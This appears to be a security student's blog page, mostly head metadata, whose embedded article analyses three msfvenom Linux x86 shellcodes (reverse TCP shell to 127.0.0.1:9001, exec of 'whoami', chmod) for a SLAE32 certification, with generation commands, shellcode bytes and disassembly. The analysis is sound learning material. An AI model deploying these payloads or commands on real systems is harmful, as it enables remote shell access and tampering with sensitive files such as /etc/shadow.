<!DOCTYPE html>
<html lang="en" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>SLAE32 Assignment 5 - Msfvenom Shellcode Analysis | nibbles</title>
<meta name="keywords" content="slae32">
<meta name="description" content="This post introduces the 5th mission to my SLAE32 journey.
A cool task to see how a widely used tool by the offensive security community produces shellcode and compare it with my own developed ones. New tricks and new cool learned.
Introduction The SLAE32 5th assignment purpose is to select 3 msfvenom payloads and document my own analysis of them.
For this task I selected the following payloads:
linux/x86/shell_reverse_tcp linux/x86/exec linux/x86/chmod Shellcode 1 - linux/x86/shell_reverse_tcp I chose this one to compare the msfvenom shellcode to the code of my first assignment.">
<meta name="author" content="nibbles">
<link rel="canonical" href="https://0xnibbles.github.io/posts/slae_32_assignment_5/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.bccfefac377bc340f06c260aed1bddf49a4354816d7c570d6aac75a997986c95.css" integrity="sha256-vM/vrDd7w0DwbCYK7Rvd9JpDVIFtfFcNaqx1qZeYbJU=" rel="preload stylesheet" as="style">
<script defer crossorigin="anonymous" src="/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js" integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG&#43;9vmJ0cTS&#43;ovo0FeA="
    onload="hljs.initHighlightingOnLoad();"></script>
<link rel="icon" href="https://0xnibbles.github.io/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="https://0xnibbles.github.io/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="https://0xnibbles.github.io/favicon-32x32.png">
<link rel="apple-touch-icon" href="https://0xnibbles.github.io/apple-touch-icon.png">
<link rel="mask-icon" href="https://0xnibbles.github.io/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --hljs-bg: rgb(46, 46, 51);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
            }

            .list {
                background: var(--theme);
            }

            .list:not(.dark)::-webkit-scrollbar-track {
                background: 0 0;
            }

            .list:not(.dark)::-webkit-scrollbar-thumb {
                border-color: var(--theme);
            }
        }

    </style>
</noscript><meta property="og:title" content="SLAE32 Assignment 5 - Msfvenom Shellcode Analysis" />
<meta property="og:description" content="This post introduces the 5th mission to my SLAE32 journey.
A cool task to see how a widely used tool by the offensive security community produces shellcode and compare it with my own developed ones. New tricks and new cool learned.
Introduction The SLAE32 5th assignment purpose is to select 3 msfvenom payloads and document my own analysis of them.
For this task I selected the following payloads:
linux/x86/shell_reverse_tcp linux/x86/exec linux/x86/chmod Shellcode 1 - linux/x86/shell_reverse_tcp I chose this one to compare the msfvenom shellcode to the code of my first assignment." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://0xnibbles.github.io/posts/slae_32_assignment_5/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2022-12-29T10:58:18+00:00" />
<meta property="article:modified_time" content="2022-12-29T10:58:18+00:00" />

<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="SLAE32 Assignment 5 - Msfvenom Shellcode Analysis"/>
<meta name="twitter:description" content="This post introduces the 5th mission to my SLAE32 journey.
A cool task to see how a widely used tool by the offensive security community produces shellcode and compare it with my own developed ones. New tricks and new cool learned.
Introduction The SLAE32 5th assignment purpose is to select 3 msfvenom payloads and document my own analysis of them.
For this task I selected the following payloads:
linux/x86/shell_reverse_tcp linux/x86/exec linux/x86/chmod Shellcode 1 - linux/x86/shell_reverse_tcp I chose this one to compare the msfvenom shellcode to the code of my first assignment."/>


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Posts",
      "item": "https://0xnibbles.github.io/posts/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "SLAE32 Assignment 5 - Msfvenom Shellcode Analysis",
      "item": "https://0xnibbles.github.io/posts/slae_32_assignment_5/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "SLAE32 Assignment 5 - Msfvenom Shellcode Analysis",
  "name": "SLAE32 Assignment 5 - Msfvenom Shellcode Analysis",
  "description": "This post introduces the 5th mission to my SLAE32 journey.\nA cool task to see how a widely used tool by the offensive security community produces shellcode and compare it with my own developed ones. New tricks and new cool learned.\nIntroduction The SLAE32 5th assignment purpose is to select 3 msfvenom payloads and document my own analysis of them.\nFor this task I selected the following payloads:\nlinux/x86/shell_reverse_tcp linux/x86/exec linux/x86/chmod Shellcode 1 - linux/x86/shell_reverse_tcp I chose this one to compare the msfvenom shellcode to the code of my first assignment.",
  "keywords": [
    "slae32"
  ],
  "articleBody": " This post introduces the 5th mission to my SLAE32 journey.\nA cool task to see how a widely used tool by the offensive security community produces shellcode and compare it with my own developed ones. New tricks and new cool learned.\nIntroduction The SLAE32 5th assignment purpose is to select 3 msfvenom payloads and document my own analysis of them.\nFor this task I selected the following payloads:\nlinux/x86/shell_reverse_tcp linux/x86/exec linux/x86/chmod Shellcode 1 - linux/x86/shell_reverse_tcp I chose this one to compare the msfvenom shellcode to the code of my first assignment. I was curious to know if I wrote something similar or if there were some tricks that I could used to improve my shellcode knowledge.\nThe first step to do is geenrate the shellcode using MSF. As usual, let’s check its arguments\nmsfvenom -p linux/x86/exec --list-options\n-[~]$ msfvenom -p linux/x86/shell_reverse_tcp --list-options Options for payload/linux/x86/shell_reverse_tcp: ========================= Name: Linux Command Shell, Reverse TCP Inline Module: payload/linux/x86/shell_reverse_tcp Platform: Linux Arch: x86 Needs Admin: No Total size: 68 Rank: Normal Provided by: Ramon de C Valle joev Basic options: Name Current Setting Required Description ---- --------------- -------- ----------- CMD /bin/sh yes The command string to execute LHOST yes The listen address (an interface may be specified) LPORT 4444 yes The listen port Description: Connect back to attacker and spawn a command shell With this information, we can generate our shellcode\n-[~]$ msfvenom -p linux/x86/shell_reverse_tcp lhost=127.0.0.1 lport=9001 -f c [-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload [-] No arch selected, selecting arch: x86 from the payload No encoder specified, outputting raw payload Payload size: 68 bytes Final size of c file: 311 bytes unsigned char buf[] = \"\\x31\\xdb\\xf7\\xe3\\x53\\x43\\x53\\x6a\\x02\\x89\\xe1\\xb0\\x66\\xcd\" \"\\x80\\x93\\x59\\xb0\\x3f\\xcd\\x80\\x49\\x79\\xf9\\x68\\x7f\\x00\\x00\" \"\\x01\\x68\\x02\\x00\\x23\\x29\\x89\\xe1\\xb0\\x66\\x50\\x51\\x53\\xb3\" \"\\x03\\x89\\xe1\\xcd\\x80\\x52\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f\" \"\\x62\\x69\\x89\\xe3\\x52\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\"; Using ndisasm:\necho -ne \"\\x31\\xdb\\xf7\\xe3\\x53\\x43\\x53\\x6a\\x02\\x89\\xe1\\xb0\\x66\\xcd\\x80\\x93\\x59\\xb0\\x3f\\xcd\\x80\\x49\\x79\\xf9\\x68\\x7f\\x00\\x00\\x01\\x68\\x02\\x00\\x23\\x29\\x89\\xe1\\xb0\\x66\\x50\\x51\\x53\\xb3\\x03\\x89\\xe1\\xcd\\x80\\x52\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x62\\x69\\x89\\xe3\\x52\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\" | ndisasm -u - 00000000 31DB xor ebx,ebx 00000002 F7E3 mul ebx 00000004 53 push ebx 00000005 43 inc ebx 00000006 53 push ebx 00000007 6A02 push byte +0x2 00000009 89E1 mov ecx,esp 0000000B B066 mov al,0x66 0000000D CD80 int 0x80 0000000F 93 xchg eax,ebx 00000010 59 pop ecx 00000011 B03F mov al,0x3f 00000013 CD80 int 0x80 00000015 49 dec ecx 00000016 79F9 jns 0x11 00000018 687F000001 push dword 0x100007f 0000001D 6802002329 push dword 0x29230002 00000022 89E1 mov ecx,esp 00000024 B066 mov al,0x66 00000026 50 push eax 00000027 51 push ecx 00000028 53 push ebx 00000029 B303 mov bl,0x3 0000002B 89E1 mov ecx,esp 0000002D CD80 int 0x80 0000002F 52 push edx 00000030 686E2F7368 push dword 0x68732f6e 00000035 682F2F6269 push dword 0x69622f2f 0000003A 89E3 mov ebx,esp 0000003C 52 push edx 0000003D 53 push ebx 0000003E 89E1 mov ecx,esp 00000040 B00B mov al,0xb 00000042 CD80 int 0x80 Filtering just by the assembly instruction with awk. The output is:\necho -ne \"\\x31\\xdb\\xf7\\xe3\\x53\\x43\\x53\\x6a\\x02\\x89\\xe1\\xb0\\x66\\xcd\\x80\\x93\\x59\\xb0\\x3f\\xcd\\x80\\x49\\x79\\xf9\\x68\\x7f\\x00\\x00\\x01\\x68\\x02\\x00\\x23\\x29\\x89\\xe1\\xb0\\x66\\x50\\x51\\x53\\xb3\\x03\\x89\\xe1\\xcd\\x80\\x52\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x62\\x69\\x89\\xe3\\x52\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\" | ndisasm -u - | awk '{ print $3,$4,$5 }' xor ebx,ebx mul ebx push ebx inc ebx push ebx push byte +0x2 mov ecx,esp mov al,0x66 int 0x80 xchg eax,ebx pop ecx mov al,0x3f int 0x80 dec ecx jns 0x11 push dword 0x100007f push dword 0x29230002 mov ecx,esp mov al,0x66 push eax push ecx push ebx mov bl,0x3 mov ecx,esp int 0x80 push edx push dword 0x68732f6e push dword 0x69622f2f mov ebx,esp push edx push ebx mov ecx,esp mov al,0xb int 0x80 Looking to the first syscall, we We can see the same syscall with value 0x66 or 102 in decimal is passed to eax. this corresponds to socketcall syscall as can be seen in the image below.\nA different from what was done in the first assignment. From analysing the code, using socketcall instead of calling the other 4 different syscalls seems to be a more clean and organized way to achieve the same result. The way socketcall works is by put a SYS_CALL value in ebx, store its arguments onto the stack and pointing ecx to esp which corresponds to the address where the beginning of the arguments are placed.\nLet’s separate the shellcode in “syscall pieces of code” by analysing each syscall and how the stack was organized.\n1 - Socketcall Syscall with SYS_SOCKET xor ebx,ebx mul ebx push ebx inc ebx push ebx push byte +0x2 mov ecx,esp mov al,0x66 int 0x80 Investigating the man page (man 2 socketcall) shows the structure as int socketcall(int call, unsigned long *args); .\ncall parameter determines which socket function to invoke. args points to a block containing the actual arguments, which are passed through to the appropriate call.\nLet’s check how the shellcode prepares the stack and then invokes socketcall.\nIt starts with the usual register clearing. In this case used xor ebx, ebx in conjunction with mul ebx to clear eax and edx. The advange or trick with this approach is to save one line of code.\nAfter that, ebx is pushed onto the stack. At this point, ebx has the value 0 which satisfies the protocol value needed for SYS_SOCKET. just a reminder for SYS_SOCKET structure: socket(PF_INET (2), SOCK_STREAM (1), IPPROTO_IP (0))\nThe same thing we’ve done when bulding our bind shell. This way pushing ebx the SOCK_STREAM argument is satisfied.\nNext, ebx is incremented which refers to the SYS_SOCKET argument we mentioned above. Then, 0x2 value which represents PF_INET is pushed tot eh stack to complete the task.\nLastly, teh address pointed by esp is passed to ecx as it references the arguments we have pushed on the stack. The last instruction (int 0x80) performs the interruption call. If successful sockfd file descriptor is stored in eax by default.\n2 - dup2() syscall xchg eax,ebx ; storing sockfd file descriptor in ebx pop ecx\t;puts 0x2 in ecx. this is going to be our coutner register mov al,0x3f ; moving dup2() syscall value to al register int 0x80 ; calling dup2() dec ecx ; decrement counter jns 0x11 ; jump near if not sign. Jumps if SF=0 From the code it calls dup2() instead of connect() which appears to be a different approachwe have performed before.\ndup2() takes sockfd file descriptor created from SYS_SOCKET interruption call and duplciates 0 (stdin),1 (stdout) and 2 (stderr) file descriptors using ecx register. This allows us to create an interactive shell.\nThe best part is how it handles the loop with the instruction jns 0x11.\nWhy 0x11?\nndisasm gives the answer.\n00000011 B03F mov al,0x3f 0x11 is a relative address or distance from the first instruction of the entire shellcode. So this will jump to 11 bytes after the first instruction (00000000 31DB xor ebx,ebx) if the loop condition is met.\n3 - socketcall with SYS_CONNECT Checking connect man page is has the following structure -\u003e int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);\nint sockfd is stored in ebx The struct structure is 0x100007f (127.0.0.1 - destination IP), 0x2923 (9001 - remote port) and AF_NET (2) push dword 0x100007f\t; pushing 127.0.0.1 remote IP push dword 0x29230002\t; pushing port 9001 and AF_INET mov ecx,esp ; pointing ecx to the top of the stack which where is the struct's location mov al,0x66 ; moving socketcall() ssycall number to al register push eax push ecx ; push ; sockaddr_in* addr push ebx ; push sockfd mov bl,0x3 ; SYS_CONNECT mov ecx,esp int 0x80 After constructing the sockaddr struct it becames straightforward to call SYS_CONNECT.\n4 - Execve() The execve organization appears to have the same instruction has what has been done in previous assigments. Not a lot of difference should be from it in the MSF shellcode.\npush edx ; pushing a null terminator onto the stack push dword 0x68732f6e\t; pushing 'hs//' onto the stack push dword 0x69622f2f\t; pushing 'nib/' onto the stack mov ebx,esp ; storing the stack pointer to /bin//sh in ebx push edx ; pushing a null terminator to build another argument push ebx ; the /bin//sh stack pointer address we had stored in ebx mov ecx,esp ; pass to ecx the stack pointer for our arguments mov al,0xb ; execve syscall number int 0x80 Shellcode 2 - linux/x86/exec Firstly, let’s check the requried argumets for the exec shellcode with the command\nmsfvenom -p linux/x86/exec --list-options\n-[~]$ msfvenom -p linux/x86/exec --list-options Options for payload/linux/x86/exec: ========================= Name: Linux Execute Command Module: payload/linux/x86/exec Platform: Linux Arch: x86 Needs Admin: No Total size: 20 Rank: Normal Provided by: vlad902 Geyslan G. Bem Basic options: Name Current Setting Required Description ---- --------------- -------- ----------- CMD no The command string to execute Description: Execute an arbitrary command or just a /bin/sh shell Generating our shellcode with msfvenom\n-[~]$ msfvenom -p linux/x86/exec CMD=whoami -f c [-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload [-] No arch selected, selecting arch: x86 from the payload No encoder specified, outputting raw payload Payload size: 42 bytes Final size of c file: 201 bytes unsigned char buf[] = \"\\x6a\\x0b\\x58\\x99\\x52\\x66\\x68\\x2d\\x63\\x89\\xe7\\x68\\x2f\\x73\" \"\\x68\\x00\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x52\\xe8\\x07\\x00\\x00\" \"\\x00\\x77\\x68\\x6f\\x61\\x6d\\x69\\x00\\x57\\x53\\x89\\xe1\\xcd\\x80\"; Using ndisasm:\necho -ne \"\\x6a\\x0b\\x58\\x99\\x52\\x66\\x68\\x2d\\x63\\x89\\xe7\\x68\\x2f\\x73\\x68\\x00\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x52\\xe8\\x07\\x00\\x00\\x00\\x77\\x68\\x6f\\x61\\x6d\\x69\\x00\\x57\\x53\\x89\\xe1\\xcd\\x80\" | ndisasm -u - Output: 00000000 6A0B push byte +0xb 00000002 58 pop eax 00000003 99 cdq 00000004 52 push edx 00000005 66682D63 push word 0x632d 00000009 89E7 mov edi,esp 0000000B 682F736800 push dword 0x68732f 00000010 682F62696E push dword 0x6e69622f 00000015 89E3 mov ebx,esp 00000017 52 push edx 00000018 E807000000 call 0x24 0000001D 7768 ja 0x87 0000001F 6F outsd 00000020 61 popa 00000021 6D insd 00000022 6900575389E1 imul eax,[eax],dword 0xe1895357 00000028 CD80 int 0x80 using awk to filter the output just for the asse,bly instructions:\necho -ne \"\\x6a\\x0b\\x58\\x99\\x52\\x66\\x68\\x2d\\x63\\x89\\xe7\\x68\\x2f\\x73\\x68\\x00\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x52\\xe8\\x07\\x00\\x00\\x00\\x77\\x68\\x6f\\x61\\x6d\\x69\\x00\\x57\\x53\\x89\\xe1\\xcd\\x80\" | ndisasm -u - | awk '{ print $3,$4,$5 }' --------------------------------------- push byte +0xb\t; push execve syscall number to stack pop eax ; puts 0xb in eax. A trick to put a value into a register without using the mov instruction cdq ; Zeroes edx. Already used this is the first assigments push edx ; push null to the stack push word 0x632d\t; pushing the string for '-c' onto the stack which will be used along with '/bin/sh' to specify 'whoami' command mov edi,esp ; store a stack pointer in edi to be used as an argument to execve push dword 0x68732f push dword 0x6e69622f\t; pushing '/bin/sh' onto the stack mov ebx,esp ; storing the stack pointer to ebx. To be used as an argument to execve as well push edx ; push null to the stack call 0x24 ; call here to the instruction at 0x20 which is 'push edi' which we stored our stack pointer in ja 0x87 outsd popa insd imul eax,[eax],dword 0xe1895357 int 0x80 --------------------------------------------------- call 0x24 To understand better what this instruction is doing, i disassembled the shellcode in gdb. Looking to the calling address, it is calling to the ‘middle’ of imul instruction which translates to push edi. By pushing edi we putting in the stack what we’ve stored there previously.\nThe instructions ja 0x87, outsd, popa, insd and imul eax,[eax],dword 0xe1895357 hide a very clever way to put our command (whoami) onto the stack.\nChecking the ndisasm output:\n0000001D 7768 ja 0x87 0000001F 6F outsd 00000020 61 popa 00000021 6D insd 00000022 6900575389E1 imul eax,[eax],dword 0xe1895357 Can we relate this behaviour on how ROP (Return Oriented Programming) gadgets are found in a binary? :)\nIf we convert the bold hex bytes we see whoami magically appear followed by a null byte (00).\nFrom cyberchef:\nAnd how this string in pushed onto the stack?\nCalling conventions is the answer. The call instruction will push the next instruction address to the stack. Similar to JMP-CALL-POP technique. That’s how our command is placed onto the stack.\nThe final result of the instruction call 0x24 is to push the address of whoami address first (calling convention), and then push edi to the stack.\nThis way the stack is properly ordered as:\n0x632d ; -c 0x77686f616d6900 ; whoam But that’s not all. We need to know what are the last two bytes (89E1) from 6900575389E1 imul eax,[eax],dword 0xe1895357 purpose.\nUsing this online disassembler those instructions are translated to:\nmov ecx, esp We mov the address pointed by the top of the stack ecx which is the second argument for exec syscall. The same way passes to the stack the the command '/bin/sh -c whoami'.\nAfter this, all argumets are pushed onto the stack. Just left execute the syscall with:\nint 0x80 Shellcode 3 - linux/x86/chmod The last shellcode is linux/x86/chmod. Checking its arguments in msfvenom.\nmsfvenom -p linux/x86/chmod --list-options\n-[~]$ msfvenom -p linux/x86/chmod --list-options Options for payload/linux/x86/chmod: ========================= Name: Linux Chmod Module: payload/linux/x86/chmod Platform: Linux Arch: x86 Needs Admin: No Total size: 36 Rank: Normal Provided by: kris katterjohn Basic options: Name Current Setting Required Description ---- --------------- -------- ----------- FILE /etc/shadow yes Filename to chmod MODE 0666 yes File mode (octal) Description: Runs chmod on specified file with specified mode So this has two options we have to provide. The file that we want to alter, and the and the chmod mode we want to make it. I will create a file within ~/Desktop/slae_x86/assignments/5-MSF_Shellcodes_Analysis directory, and chmod it to be an executable.\n-r--r----- 1 edu edu 0 Nov 24 14:23 test.txt sudo msfvenom -p linux/x86/chmod FILE=/home/edu/Desktop/slae_x86/assignments/5-MSF_Shellcodes_Analysis/test.txt MODE=0777 -f c Output:\n-[~]$ msfvenom -p linux/x86/chmod FILE=/home/edu/Desktop/slae_x86/assignments/5-MSF_Shellcodes_Analysis/test.txt MODE=0777 -f c [-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload [-] No arch selected, selecting arch: x86 from the payload No encoder specified, outputting raw payload Payload size: 98 bytes Final size of c file: 437 bytes unsigned char buf[] = \"\\x99\\x6a\\x0f\\x58\\x52\\xe8\\x4a\\x00\\x00\\x00\\x2f\\x68\\x6f\\x6d\" \"\\x65\\x2f\\x65\\x64\\x75\\x2f\\x44\\x65\\x73\\x6b\\x74\\x6f\\x70\\x2f\" \"\\x73\\x6c\\x61\\x65\\x5f\\x78\\x38\\x36\\x2f\\x61\\x73\\x73\\x69\\x67\" \"\\x6e\\x6d\\x65\\x6e\\x74\\x73\\x2f\\x35\\x2d\\x4d\\x53\\x46\\x5f\\x53\" \"\\x68\\x65\\x6c\\x6c\\x63\\x6f\\x64\\x65\\x73\\x5f\\x41\\x6e\\x61\\x6c\" \"\\x79\\x73\\x69\\x73\\x2f\\x74\\x65\\x73\\x74\\x2e\\x74\\x78\\x74\\x00\" \"\\x5b\\x68\\xff\\x01\\x00\\x00\\x59\\xcd\\x80\\x6a\\x01\\x58\\xcd\\x80\"; Using ndisasm:\necho -ne \"\\x99\\x6a\\x0f\\x58\\x52\\xe8\\x4a\\x00\\x00\\x00\\x2f\\x68\\x6f\\x6d\\x65\\x2f\\x65\\x64\\x75\\x2f\\x44\\x65\\x73\\x6b\\x74\\x6f\\x70\\x2f\\x73\\x6c\\x61\\x65\\x5f\\x78\\x38\\x36\\x2f\\x61\\x73\\x73\\x69\\x67\\x6e\\x6d\\x65\\x6e\\x74\\x73\\x2f\\x35\\x2d\\x4d\\x53\\x46\\x5f\\x53\\x68\\x65\\x6c\\x6c\\x63\\x6f\\x64\\x65\\x73\\x5f\\x41\\x6e\\x61\\x6c\\x79\\x73\\x69\\x73\\x2f\\x74\\x65\\x73\\x74\\x2e\\x74\\x78\\x74\\x00\\x5b\\x68\\xff\\x01\\x00\\x00\\x59\\xcd\\x80\\x6a\\x01\\x58\\xcd\\x80\" | ndisasm -u - 00000000 99 cdq 00000001 6A0F push byte +0xf 00000003 58 pop eax 00000004 52 push edx 00000005 E84A000000 call 0x54 0000000A 2F das 0000000B 686F6D652F push dword 0x2f656d6f 00000010 6564752F fs jnz 0x43 00000014 44 inc esp 00000015 65736B gs jnc 0x83 00000018 746F jz 0x89 0000001A 702F jo 0x4b 0000001C 736C jnc 0x8a 0000001E 61 popa 0000001F 655F gs pop edi 00000021 7838 js 0x5b 00000023 362F ss das 00000025 61 popa 00000026 7373 jnc 0x9b 00000028 69676E6D656E74 imul esp,[edi+0x6e],dword 0x746e656d 0000002F 732F jnc 0x60 00000031 352D4D5346 xor eax,0x46534d2d 00000036 5F pop edi 00000037 53 push ebx 00000038 68656C6C63 push dword 0x636c6c65 0000003D 6F outsd 0000003E 6465735F gs jnc 0xa1 00000042 41 inc ecx 00000043 6E outsb 00000044 61 popa 00000045 6C insb 00000046 7973 jns 0xbb 00000048 69732F74657374 imul esi,[ebx+0x2f],dword 0x74736574 0000004F 2E7478 cs jz 0xca 00000052 7400 jz 0x54 00000054 5B pop ebx 00000055 68FF010000 push dword 0x1ff 0000005A 59 pop ecx 0000005B CD80 int 0x80 0000005D 6A01 push byte +0x1 0000005F 58 pop eax 00000060 CD80 int 0x80 Filtering just by the assembly instruction with awk. The output is:\necho -ne \"\\x99\\x6a\\x0f\\x58\\x52\\xe8\\x4a\\x00\\x00\\x00\\x2f\\x68\\x6f\\x6d\\x65\\x2f\\x65\\x64\\x75\\x2f\\x44\\x65\\x73\\x6b\\x74\\x6f\\x70\\x2f\\x73\\x6c\\x61\\x65\\x5f\\x78\\x38\\x36\\x2f\\x61\\x73\\x73\\x69\\x67\\x6e\\x6d\\x65\\x6e\\x74\\x73\\x2f\\x35\\x2d\\x4d\\x53\\x46\\x5f\\x53\\x68\\x65\\x6c\\x6c\\x63\\x6f\\x64\\x65\\x73\\x5f\\x41\\x6e\\x61\\x6c\\x79\\x73\\x69\\x73\\x2f\\x74\\x65\\x73\\x74\\x2e\\x74\\x78\\x74\\x00\\x5b\\x68\\xff\\x01\\x00\\x00\\x59\\xcd\\x80\\x6a\\x01\\x58\\xcd\\x80\" | ndisasm -u - | awk '{print $3,$4,$5}' cdq ; zeroes edx push byte +0xf\t; push 0xf --\u003e chmod syscall number pop eax ; put 0xf in eax push edx ; push a null onto the stack call 0x54 ; pushes next instruction address (\"push dword 0x2f656d6f\") and jumps execution to the instruction placed 0x54 bytes relative to the start of the shellcode \"; start of the test.txt path bytes\" das push dword 0x2f656d6f fs jnz 0x43 inc esp gs jnc 0x83 jz 0x89 jo 0x4b jnc 0x8a popa gs pop edi js 0x5b ss das popa jnc 0x9b imul esp,[edi+0x6e],dword 0x746e656d jnc 0x60 xor eax,0x46534d2d pop edi push ebx push dword 0x636c6c65 outsd gs jnc 0xa1 inc ecx outsb popa insb jns 0xbb imul esi,[ebx+0x2f],dword 0x74736574 cs jz 0xca jz 0x54 \"end of test.txt string bytes\" \"; start of decode stub\" pop ebx push dword 0x1ff pop ecx int 0x80 push byte +0x1 pop eax int 0x80 This instructions purpose are not to be “real” instructions or obfuscated code. It’s simply /home/eduardo/Desktop/slae_x86/assignments/5-MSF_Shellcodes_Analysis/test.txt string bytes that were placed in memory which represent the correpondent assembly instructions.\nMoving to 0x54 bytes from the beggining, we jmp to the instruction pop ebx. This is where the decode stub is placed.\nYou can check the first ndisasm output and see\n00000054 5B pop ebx From there, file path bytes are decoded and chmod is executed.\npop ebx ; execution is redirected to here. Store stack pointers of /home/eduardo/Desktop/slae_x86/assignments/5-MSF_Shellcodes_Analysis/test.txt in ebx (1st arg) push dword 0x1ff\t; pushes the permissions or MODE parameter to be changed in the file pointed by ebx. 0x1ff (hex) = 777 (octal) pop ecx ; stores 0x1ff in ecx which is the 2chmod's 2nd arg int 0x80 ; calls chmod push byte +0x1\t; pushes onto the stack the exit syscalll number pop eax ; stores x01 in eax int 0x80\t; calls exit Lessons learned The best trick I saw was to place string bytes as assembly isntructions and then decode them in runtime. In fact, is similar to the encoder lesson from the course but the methodology is applied in a different way.\nAn example on how to think outside the box and how we cane be creative if we put some effort on that.\nA apart from that, the shellcodes had many null-bytes but the real outcome how after doing the full analysis of the shellcodes in this blog post. My curiosity talk louder and I tried generating these payloads using null bytes as badchars.\nFor my surprise, I noticed some of the null bytes were being introducing by local jumps using the call instruction with jmp-call-pop technique. This technique was replaced by the fnstenv technique which was mentioned in one of the challenges placed during the course.\nThis way we can store the address of the next instruction in the FPU stack and avoid introducing null bytes with call instruction.\nThe most important one: this assignment remembered me how we can learn from reading not just shellcode but any code from other languages written by others.\nA lesson that we can apply to any other task in other area (hardware, cooking, communication, etc).\nDoing that we can learn new techniques, new ways to think when we face a problem and be more efficient in any task during our life.\nThis blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/\nStudent ID: PA-31319\nAll the source code files are available on GitHub at https://github.com/0xnibbles/slae_x86\n",
  "wordCount" : "2987",
  "inLanguage": "en",
  "datePublished": "2022-12-29T10:58:18Z",
  "dateModified": "2022-12-29T10:58:18Z",
  "author":{
    "@type": "Person",
    "name": "nibbles"
  },
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://0xnibbles.github.io/posts/slae_32_assignment_5/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "nibbles",
    "logo": {
      "@type": "ImageObject",
      "url": "https://0xnibbles.github.io/favicon.ico"
    }
  }
}
</script>
</head>

<body class="" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.body.classList.add('dark');
    } else if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.body.classList.add('dark');
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="https://0xnibbles.github.io/" accesskey="h" title="nibbles (Alt + H)">nibbles</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="https://0xnibbles.github.io/" title="Home">
                    <span>Home</span>
                </a>
            </li>
            <li>
                <a href="https://0xnibbles.github.io/about.html" title="About">
                    <span>About</span>
                </a>
            </li>
            <li>
                <a href="https://0xnibbles.github.io/categories/" title="Categories">
                    <span>Categories</span>
                </a>
            </li>
            <li>
                <a href="https://0xnibbles.github.io/projects/" title="Projects">
                    <span>Projects</span>
                </a>
            </li>
            <li>
                <a href="https://0xnibbles.github.io/archives" title="Archive">
                    <span>Archive</span>
                </a>
            </li>
            <li>
                <a href="https://0xnibbles.github.io/tags/" title="Tags">
                    <span>Tags</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    <div class="breadcrumbs"><a href="https://0xnibbles.github.io/">Home</a>&nbsp;»&nbsp;<a href="https://0xnibbles.github.io/posts/">Posts</a></div>
    <h1 class="post-title">
      SLAE32 Assignment 5 - Msfvenom Shellcode Analysis
    </h1>
